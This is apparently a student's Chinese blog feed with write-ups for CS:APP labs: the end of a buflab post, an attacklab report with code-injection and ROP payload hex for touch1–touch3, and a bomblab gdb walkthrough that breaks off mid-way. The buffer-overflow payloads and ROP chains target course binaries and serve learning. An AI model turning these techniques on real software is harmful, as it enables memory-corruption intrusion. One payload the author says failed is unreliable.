&lt;attackraw4.txt</code>就可以了，没想到只输入一次，就是说每次都只有第一个是对的，一定要换这种命令才可以将字符串复制五次输入的，踩过的坑千万别踩，否则后果就是罚坐三小时，让大家康康我的撒花吧！！！</p><p><img src="https://i.loli.net/2021/04/30/oaBdniV29RuOLN4.png" alt="buflab_level4_4.png"></p><p>本作者在写wp的时候喜欢加上自己的思考，因为我也是新手，这篇wp对新手就比较友好，因为大概率是可以踩到目前新手能踩到的大部分坑的，如果哪里说的不对，恳请指正！</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>attacklab实验报告:代码注入以及rop攻击</title>
      <link href="/2021/04/25/attqacklab/"/>
      <url>/2021/04/25/attqacklab/</url>
      
        <content type="html"><![CDATA[<p>今天来康康attack lab啊</p><span id="more"></span><h2 id="Ctarget"><a href="#Ctarget" class="headerlink" title="Ctarget"></a>Ctarget</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>题目给出函数<code>test</code>，<code>test</code>里面有函数<code>getbuf</code>，然后它给定的提权函数是<code>touch1()</code>，我们那我们先<code>gdb ctarget</code>进入调试，然后输入<code>disassemble getbuf</code>查看汇编代码。</p><p><img src="https://i.loli.net/2021/04/26/4rX8hQMRAoB9g6k.png" alt="attacklab_Ctarget_level1_1.png"></p><p>可以很清楚的看到函数的缓冲区大小是<code>0x28</code>字节，然后<code>gets</code>已经说明是库的标准函数了，<code>gets</code>函数是有漏洞的，它在读入字符串的时候不会对长度检测，而是给多少读多少。那么我们可以用这个<code>gets</code>来实现栈溢出，执行我们的权限函数<code>touch1()</code>，我们可以先用<code>00</code>字节填充<code>40</code>个字节，然后再加上<code>shell</code>函数的地址。注意前面可以用除了<code>0a</code>的任意字节填充，因为<code>0a</code>代表<code>’\n’</code>的意思，<code>gets</code>函数一旦读到这个字符就会认为字符串读取结束了。我们用<code>print touch1</code>去查看该函数的地址。</p><p><img src="https://i.loli.net/2021/04/26/tsoDagXldAT5NYC.png" alt="attacklab_ctarget_level1_2.png"></p><p>发现了提权函数的地址之后我们就可以构造<code>payload</code>了。我们先<code>q</code>退出<code>gdb</code>，然后这里先创建一个文本文件<code>vim attack1.txt</code> 然后填充</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40</span><br></pre></td></tr></table></figure><p>注意，地址在计算机里是<strong>小端序</strong>存储。也就是<strong>高地址存储高位字节</strong>，然后我们构造的<code>payload</code>是往<strong>栈底方向</strong>填充的，而栈又是<strong>向低地址增长</strong>的，因此如此反转过后我们的函数地址要按字节倒着填充。然后根据字节生成字符串文件。</p><p>运行题目给的<code>hex2raw</code>文件，<code>./hex2raw &lt;source file&gt; target file</code>命令去生成目标文件。然后再<code>./ctarget -q -i target file</code>这里我生成的文件名叫<code>attackraw1.txt</code>，然后终端输入运行命令，发现攻击成功了。</p><p><img src="https://i.loli.net/2021/04/26/vY3tahzlkjQudCZ.png" alt="attacklab_ctarget_level1_3.png"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>这个需要攻击执行的函数名为<code>touch2()</code>，这个栈溢出的漏洞依然可以利用。但是<code>print touch2</code>之后你就会发现，<code>touch2</code>比<code>touch1</code>多了一个参数。故技重施之后发现：</p><p><img src="https://i.loli.net/2021/04/26/LAOwMRtHp97zThr.png" alt="attacklab_ctarget_level2_1.png"></p><p>虽然我们成功执行了<code>touch2()</code>函数，但是还是失败了，发现<code>touch2()</code>事实上那个参数是用来检测是否与<code>cookie</code>匹配的，而<code>cookie</code>的值已经告诉你了。在32位的程序里面，我们可以往返回地址后面写上<code>cookie</code>作为参数，但是64位程序前6个参数采用寄存器传参，那么要成功攻击就必须修改<code>rdi</code>寄存器的值为<code>cookie</code>。因为我们直接在返回位置覆盖函数地址，跟普通调用的区别就少了参数的传递，所以rdi的值至少在执行getbuf函数的时候不会看遍，这里有40字节大小的栈空间，那么我们就可以往栈中注入代码，代码应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line"></span><br><span class="line">call $touch2</span><br></pre></td></tr></table></figure><p><code>call</code>命令的操作数是根据<code>rip</code>偏移来的，那确定不了这个偏移，就没办法准确的<code>call</code>到这个<code>touch2()</code>函数，那么换一个思路：先往栈上堆返回地址，再返回<code>ret</code>弹出返回，那么我们在往栈上注入代码就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>就完成了，再加上填充字节总共40字节再在末尾返回栈地址就可以直接执行刚刚注入的代码了。我们接下来就要确定栈的地址了。<code>gdb ctarget </code>然后在<code>getbuf</code>这里下断点.<code>r -q</code>运行到<code>sub rsp,0x28</code>这一步我们观察栈指针的位置</p><p><img src="https://i.loli.net/2021/04/26/51MLvTDFXRdAIjK.png" alt="attacklab_ctarget_level2_2.png"></p><p>那么我们可以在返回地址的位置指向栈中我们堆的代码的位置，让它执行这些指令，以此达到传参且执行函数的目的。依然要注意小端问题。接下来我们只需要解决一个问题：如何把汇编代码转换为字节码？</p><p>先<code>vim 1.s</code>，填入汇编代码，然后<code>gcc -c 1.s -o 1.o</code>汇编之后，再<code>objdump -d 1.o</code>反汇编就可以查看汇编代码的字节码了。</p><p><img src="https://i.loli.net/2021/04/26/b7dpJR2DMv8N3k5.png" alt="attacklab_ctarget_level2_4.png"></p><p>易得<code>payload</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure><p>可以看到，攻击成功了。</p><p><img src="https://i.loli.net/2021/04/26/mbuiMhVOGQY2Tca.png" alt="attacklab_ctarget_level2_3.png"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>这里的提权函数是<code>touch3</code>，<code>writeup</code>中已经给了我们函数的语句(Ps:我做到这里才知道writeup是说明的意思qwq)。</p><p><img src="https://i.loli.net/2021/04/26/R37sHQJ1e5FWf2n.png" alt="attacklab_Ctarget_level3_1.png"></p><p>要求<code>hexmatch</code>函数返回<code>true</code>，这次攻击才能成功，题目也给了我们这个函数的语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall hexmatch(unsigned int val, char *sval)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v2; // rbx</span><br><span class="line">  char cbuf[110]; // [rsp+0h] [rbp-98h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+78h] [rbp-20h]</span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v2 = &amp;cbuf[random() % 100];</span><br><span class="line">  __sprintf_chk(v2, 1LL, -1LL, &quot;%.8x&quot;, val);</span><br><span class="line">  return strncmp(sval, v2, 9uLL) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数两个输入，一个就是<code>val</code>，那么实参就是<code>cookie</code>的值，已经确定了改不了了，<code>sval</code>参数是<code>touch3()</code>原参数给的，因此我们在<code>call touch3</code>的时候给<code>rdi</code>传的参数就可以是<code>hexmatch</code>的第二个参数。中间有一步是徐晃一枪，那就是这个随机函数了，但是接下来有一个<code>sprintf</code>函数，<code>sprintf</code>函数是将格式化字符串输出给<code>s</code>。那么把<code>val</code>以<code>8</code>位十六进制数给<code>s</code>的意思就是<code>s=&quot;59b997fa&quot;</code>,所以<code>s</code>字符串看似随机实则固定的。字符串传参是传字符串首字符的<code>char</code>指针，数值为首字符到<code>’\0’</code>之间的所有字符（大端序）。那么我们构造的<code>sval</code>字符串的字节码就要应该是：<code>35 39 62 39 39 37 66 61</code>，知道了要构造的字符串之后还要想办法将它作为参数传到<code>rdi</code>里面。我们可以将它保存到栈中的某个位置，因为在调用函数的时候<code>getbuf</code>栈帧的部分可能会因为正常调用<code>hexmatch</code>函数被破坏，所以我们在缓冲区下<code>4</code>个字节填充所需的字符串，就算破坏其它栈帧也没有关系，只要能执行就<code>ok</code>。那么很容易构造<code>payload</code>：在这里要注入的代码跟原来差不多，只是参数要变成<code>cookie</code>字符串的首地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 </span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 </span><br><span class="line">00</span><br></pre></td></tr></table></figure><p>注意最后一位要<code>00</code> 填充，因为字符串是要到<code>00</code>才结束的，如果不是那么就会一直进行下去。</p><h2 id="rtarget"><a href="#rtarget" class="headerlink" title="rtarget"></a>rtarget</h2><h3 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h3><p>这个官方的<code>writeup</code>已经明确说了，栈只读，因此得采取<code>rop</code>的方式取攻击执行<code>touch2()</code>。</p><p>我们使用<code>objdump -d rtarget</code>去查看代码碎片看看哪里可以利用。首先我们想的应该是，<code>movq $0x59b997fa,%rdi</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>但是发现你根本找不到<code>movq $0x59b997fa,%rdi</code>，所以这个方法略掉。</p><p>那还有<code>plan B</code>：在栈上<code>rsp</code>里面装入那个数然后<code>popq</code>弹到<code>rdi</code>里面就好了，那么我们想的就是，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>我们搜索一下<code>popq %rdi </code>的字节码<code>5f</code>，发现<code>0x40233a</code>有一个5f的</p><p>那就很容易构造<code>payload</code>了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">3a 23 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/kCrAciSvRxqJgWs.png" alt="attacklab_rtarget_level2_1.png"></p><p>事实上这里我是没有攻击成功的，我觉得从逻辑上来讲是没有任何问题的，有大佬看到蒟蒻的小错误恳请帮忙指正。那么正确的做法是先把它pop到rax寄存器里面，然后执行<code>movq %rax,%rdi</code>然后再<code>ret touch3()</code>？？？到底有啥区别嘛，还是搞不懂。。</p><p>那么代码就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>构造出来的payload就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>这个应该不难，但是我还是想知道我的哪里有问题！！！</p><h3 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h3><p>首先想想我们要干嘛？构造在一个特殊的地方构造字符串然后把字符串字符首地址传给<code>rdi</code>就能直接攻击成功。开启了栈只读和地址随机化，那么我们还是只能通过栈去溢出，肯定是要先把字符串写在后面，中间全是<code>gadget</code>。然后通过确定<code>rsp</code>的值以及我们已构造的<code>gadget</code>，我们就可以很轻松地获得字符串地址。</p><p>那么我们需要的汇编代码就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//movq %rsp,%rdi</span><br><span class="line">movq %rsp,%raxa</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">add $offset,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>这里主要是add这条指令，别问我为什么刚才的思路打断了，都是上面那个<code>level2</code>搞得，就佛系一点把，先把它传给<code>rax</code>再给<code>rdi</code>也一样的，即使我不知道一步到位为什么不行。接下来是寻找<code>gadget</code>了。其它的都能很好找到，唯独<code>add</code>这条指令不好搞，但是我们可以大致看一下规律。</p><p><img src="https://i.loli.net/2021/04/26/Sl1a8dpCuFRA7jO.png" alt="attacklab_rtarget_level3_1.png"></p><p>我们可以很清晰地发现，<code>add $xxx,%rdi</code>的一般规律就是 <code>48 83 c7</code> 然后后面一个字节确定立即数的大小那么就去搜索一下<code>48 83 c7</code>，但是很快就会发现，搜不到这个<code>gadget</code>。那么换一种思路，既然我们先传给了<code>rax</code>那我们可以先让<code>rax</code>加上那个值啊。说干就干，汇编再反之后得到字节码<code>48 05 00</code>发现还是找不到，一筹莫展之际，你突然想到，可以利用寄存器的低位，他们的操作码也有很大区别的，比如<code>rax</code>的低32位是<code>eax</code>，低16位是<code>ax</code>，低8位是<code>al</code>，我们一个个找过去发现add al有一个。04 37 这刚好是al+0x37的gadget。</p><p><img src="https://i.loli.net/2021/04/26/PiXlM34VsBgL1qT.png" alt="attacklab_rtarget_level3_2.png"></p><p>这个大小也是非常合适的，在尽量保证能够全覆盖的情况下保证<code>payload</code>越小越好，大了容易出事。</p><p>那么如此我们就只到我们重新堆的代码结构了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp,%rax</span><br><span class="line">add $0x37,al</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00// movq %rsp,%rax</span><br><span class="line">d8 19 40 00 00 00 00 00// add $0x37,al</span><br><span class="line">c5 19 40 00 00 00 00 00// movq %rax,%rdi</span><br><span class="line">fa 18 40 00 00 00 00 00//touch3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 35//cookie</span><br><span class="line">39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>然后完结撒花啦！！</p><p>第一次能自己写完csapp的lab，虽然难，但是收获颇丰，若有不正，恳请指正！！</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bomblab实验报告:二进制安全与逆向分析</title>
      <link href="/2021/04/19/bomblab/"/>
      <url>/2021/04/19/bomblab/</url>
      
        <content type="html"><![CDATA[<p>先观察给的.c文件，发现是要输入六组语句并且判断正误的，并且很容易发现判断函数phase_i(i=1,2…6)要有一个错误，炸弹即爆炸，那我们就要用到gdb调试了,在终端输入<code>gdb bomb</code>进入调试</p><span id="more"></span><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>首先在phase_1处断点（命令：<code>b phase_1</code>）找到phase_1的拆弹语句。然后<code>r</code>运行，先随便输入点东西这里我输入了很多a,断在该处之后单步调试，因为要进入函数内部，我们用命令<code>step</code>或者<code>s</code>进行单步调试。调试发现一个<code>strings_not_equal</code>函数，跟进去看发现寄存器<code>rdi</code>为我们输入的很多个a，而寄存器<code>rsi</code>已经有了一句话。</p><p><img src="https://i.loli.net/2021/04/25/dVN392JXrMQjDwu.png" alt="bomblab_phase_1_1.png"></p><p>那么能直接断定这个就是我们的拆弹语句，重新调试进去输入那个语句<code>Border relations with Canada have never been better.</code>发现成功拆掉了这个炸弹，那么phase_1就拆掉了。</p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>拆完了之后就看向phase_2，我们先<code>delete</code>    清除所有断点然后<code>b phase_2</code>新增断点，<code>r</code>之后先输入之前的拆弹语句来到phase_2，我们照例输入很多的a，<code>s</code>单步调试进去发现有一个函数叫<code>read_six_numbers</code>，跟进去发现</p><p><img src="https://i.loli.net/2021/04/25/J7O8Yjl9kKnC1SN.png" alt="bomblab_phase_2_1.png"></p><p>调用了<code>scanf</code>函数并且能看到参数<code>%d %d %d %d %d %d</code>，那无疑我们这次应该输入六个整数。那就先猜，就先输入6个0也罢，但此时我们不能’s’单步调试了，因为<code>scanf</code>内部构造很复杂，<code>s</code>单步调试会把你键盘按烂的。因此我们用<code>next</code>或<code>n</code>单步调试，跳过了<code>scanf</code>函数的内部，成功给了6个整数，然后继续调试，发现</p><p><img src="https://i.loli.net/2021/04/25/Kil6fnbgrRJH4hm.png" alt="bomblab_phase_2_2.png"></p><p><code>ptr[rsp]=1</code>才能跳转避免执行到<code>explode</code>函数，我们稍微调试一下也可以发现<code>ptr[rsp]</code>存了第一个输入的数值，那么就可以很容易得到第一个整数是<code>1</code>，我们把第一个值改成1，其它的照常不变，发现第一个数躲过了爆炸，那么说明我们的方案可行，接下来只需要把剩下五个数判断完了就可以了。继续<code>n</code>单步调试，发现第二个测试的数是</p><p><img src="https://i.loli.net/2021/04/25/HRzX9CYaBQLN1Sc.png" alt="bomblab_phase_2_3.png"></p><p>一样的是比较<code>eax</code>上面我们可以看到有一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add eax,eax</span><br></pre></td></tr></table></figure><p>然后再比较，那么第二个数不就应该是2了吗？，虽然我也不知道为什么<code>ptr[rbx]</code>它就是第二个数，但是稍微想想也知道肯定是依次对你的输入去判断的，所以第二个数是2了。同理，他每次都加上自己，那么每次输入的数就是前面数的两倍，那清晰了，答案应该就是<code>1 2 4 8 16 32</code>。清除断点输入后发现没有爆炸，那么phase_2也拆弹成功了。</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>然后断点下在phase_3，接着运行到那边。运行到scanf发现格式化字符串为”%d %d”，那就是两个整数，并且看到后面有一个<code>cmp eax,1</code>，并且要求<code>eax&gt;1</code>，否则就执行爆炸函数了，<code>eax</code>在<code>scanf</code>之后获得了<code>scanf</code>函数的返回值，scanf的返回值就是输入数的个数。那我们就随便输入俩数看看。</p><p><img src="https://i.loli.net/2021/04/25/JPg3Rp4u7Tjr6If.png" alt="bomblab_phase_3_1.png"></p><p>继续调试发现，如果<code>ptr[rsp+8]</code>大于<code>7</code>会发生跳转不妨先输入大于<code>7</code>的值看看会跳转到哪儿，输入之后，好的，成功爆炸，躲不掉的那种哦。</p><p><img src="https://i.loli.net/2021/04/25/etqlSa591MrFCVp.png" alt="bomblab_phase_3_2.png"></p><p>那看来我们第一个数只能输入<code>0~7</code>之内的值，我们先输入<code>0 0</code>来看看，继续单步调试发现</p><p><img src="https://i.loli.net/2021/04/25/mz7utwg8CNbLYPU.png" alt="bomblab_phase_3_3.png"></p><p>那说明我们应该输入<code>0 207</code>，因为<code>eax</code>被赋值了<code>0xcf</code>，然后又比较中也含有<code>eax</code>重新来一遍发现竟然过了，直接能进入到phase_4的那种，那么你就会思考，<code>1~7</code>会发生什么，据测试，每个数对应了一个整数，你可以理解为有一个函数<code>f(x)x∈[0,7]∩Z</code>然后你必须正确输入<code>x f(x)</code>的其中一个对应。那你可能还会想，负数有没有对应，其实我也试过，负数直接就不行了，因为<code>jg</code>指令是判断无符号数的，负数就会被看成一个很大的正整数，那么你还是不可避免的爆炸了。</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p>在<code>phase_4</code>处断点，依次输入前三条拆弹语句，第四句老规矩输入很多<code>a</code>，<code>s</code>单步调试进入<code>scanf</code>，发现语句依然是<code>%d %d</code>，好嘛，又是两个整型，那重来，先<code>0 0</code>，<code>n</code>单步调试进去发现有一个语句<code>cmp eax,2 jne</code>，<code>jne</code>为<code>jump not equal</code>这个判断也很简单，就是看<code>scanf</code>有没有输入2个数，它都是<code>%d %d</code>了，肯定你只能输入两个数啊，不是两个就爆炸了(<del>Ps:别问我为什么这么肯定的</del>)。</p><p><img src="https://i.loli.net/2021/04/25/fTMdxrpsWg1ocXE.png" alt="bomblab_phase_4_1.png"></p><p>输入两个<code>0</code>发现莫名其妙过了，其实我想就这么水过去的，但是还得去分析的。</p><p><code>disassemble func4</code>查看一下它那个函数的汇编代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x08048d0b &lt;+0&gt;:    sub    $0x1c,%esp</span><br><span class="line">   0x08048d0e &lt;+3&gt;:    mov    %ebx,0x14(%esp)</span><br><span class="line">   0x08048d12 &lt;+7&gt;:    mov    %esi,0x18(%esp)</span><br><span class="line">   0x08048d16 &lt;+11&gt;:    mov    0x20(%esp),%eax</span><br><span class="line">   0x08048d1a &lt;+15&gt;:    mov    0x24(%esp),%edx</span><br><span class="line">   0x08048d1e &lt;+19&gt;:    mov    0x28(%esp),%esi </span><br><span class="line">   0x08048d22 &lt;+23&gt;:    mov    %esi,%ecx</span><br><span class="line">   0x08048d24 &lt;+25&gt;:    sub    %edx,%ecx       </span><br><span class="line">   0x08048d26 &lt;+27&gt;:    mov    %ecx,%ebx</span><br><span class="line">   0x08048d28 &lt;+29&gt;:    shr    $0x1f,%ebx    </span><br><span class="line">   0x08048d2b &lt;+32&gt;:    add    %ebx,%ecx     </span><br><span class="line">   0x08048d2d &lt;+34&gt;:    sar    %ecx          </span><br><span class="line">   0x08048d2f &lt;+36&gt;:    lea    (%ecx,%edx,1),%ebx    </span><br><span class="line">   0x08048d32 &lt;+39&gt;:    cmp    %eax,%ebx</span><br><span class="line">   0x08048d34 &lt;+41&gt;:    jle    0x8048d4d &lt;func4+66&gt;</span><br><span class="line">   0x08048d36 &lt;+43&gt;:    lea    -0x1(%ebx),%ecx</span><br><span class="line">   0x08048d39 &lt;+46&gt;:    mov    %ecx,0x8(%esp)</span><br><span class="line">   0x08048d3d &lt;+50&gt;:    mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048d41 &lt;+54&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048d44 &lt;+57&gt;:    call   0x8048d0b &lt;func4&gt;</span><br><span class="line">   0x08048d49 &lt;+62&gt;:    add    %eax,%ebx   </span><br><span class="line">   0x08048d4b &lt;+64&gt;:    jmp    0x8048d66 &lt;func4+91&gt;</span><br><span class="line">   0x08048d4d &lt;+66&gt;:    cmp    %eax,%ebx  </span><br><span class="line">   0x08048d4f &lt;+68&gt;:    jge    0x8048d66 &lt;func4+91&gt;</span><br><span class="line">   0x08048d51 &lt;+70&gt;:    mov    %esi,0x8(%esp)</span><br><span class="line">   0x08048d55 &lt;+74&gt;:    lea    0x1(%ebx),%edx </span><br><span class="line">   0x08048d58 &lt;+77&gt;:    mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048d5c &lt;+81&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048d5f &lt;+84&gt;:    call   0x8048d0b &lt;func4&gt;</span><br><span class="line">   0x08048d64 &lt;+89&gt;:    add    %eax,%ebx  </span><br><span class="line">   0x08048d66 &lt;+91&gt;:    mov    %ebx,%eax   </span><br><span class="line">   0x08048d68 &lt;+93&gt;:    mov    0x14(%esp),%ebx</span><br><span class="line">   0x08048d6c &lt;+97&gt;:    mov    0x18(%esp),%esi</span><br><span class="line">   0x08048d70 &lt;+101&gt;:    add    $0x1c,%esp</span><br><span class="line">   0x08048d73 &lt;+104&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>这个函数先放在这我们先看后面有哪些条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test   eax, eax</span><br><span class="line">jne    phase_4+76 &lt;phase_4+76&gt; </span><br><span class="line">cmp    dword ptr [rsp + 0xc], 0</span><br><span class="line">je     phase_4+81 &lt;phase_4+81&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一次是跳转会爆炸，第二次是不跳转会爆，那么换言之，两次都必须等于，那么第一次的<code>test eax,eax</code>它干什么了呢？先想一想它怎么判断两个数相等，两个数相等当且仅当它们之差为0时成立，字符串也同理。那么换言之，它就判断<code>eax</code>的值是不是<code>0</code>而已相等为<code>0</code>，不相等则不为<code>0</code>。那么很清楚了，防止它跳转，我们要保证<code>eax</code>寄存器值为0。下面就是判断第二个输入的值是否为0了，为0跳转。</p><p><img src="https://i.loli.net/2021/04/25/usg2zr6lbFYjwhE.png" alt="bomblab_phase_4_2.png"></p><p>实际上，这里的<code>ptr[rsp+0xc]</code>就是我们输入第二个数的低八位。因此第二个数只能输入<code>0</code>因为第一次比较用到了寄存器比较，我们也不知道运行这个函数之后函数的返回值是多少(<code>rax</code>保存函数返回值)，只能去调试看看。因此这个答案是<code>0 0</code></p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>依然先断点，输入之前四句拆弹语句。到这里之后随便输入点东西，发现了</p><p><img src="https://i.loli.net/2021/04/25/sQSBH3YFexy6dNJ.png" alt="bomblab_phase_5_1.png"></p><p>这回是要输入一串字符串，而且还有长度检测，不等于6直接爆炸qwq。</p><p>那我们先随便输入一个<code>aaaaaa</code>看看情况</p><p><img src="https://i.loli.net/2021/04/25/JaWfPYRIysXc9qU.png" 